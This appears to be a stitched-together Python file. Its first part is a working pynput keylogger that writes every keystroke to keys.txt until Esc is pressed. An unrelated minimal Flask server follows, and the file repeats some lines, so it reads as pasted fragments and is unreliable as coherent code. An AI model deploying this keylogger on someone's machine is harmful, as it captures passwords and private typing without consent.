log_file = "keys.txt"
open(log_file, "w").close()

from pynput import keyboard

log_file = "keys.txt"

def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release) as listener:
    listener.join()
import os
from flask import Flask
import os

app = Flask(__name__)

@app.route("/")
def home():
    return "Backend is running successfully!"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
